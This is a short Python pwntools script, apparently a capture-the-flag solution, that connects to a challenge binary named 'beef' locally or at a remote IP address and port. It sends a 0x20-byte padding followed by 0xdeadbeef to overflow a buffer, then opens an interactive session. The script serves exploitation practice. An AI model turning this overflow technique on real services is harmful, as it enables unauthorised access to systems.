#!/usr/bin/python3

from pwn import *

exe = ELF('beef', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('139.144.184.150', 31337)
else:
        p = process(exe.path)

GDB()
sl(b"a"*0x20 + p32(0xdeadbeef))
p.interactive()
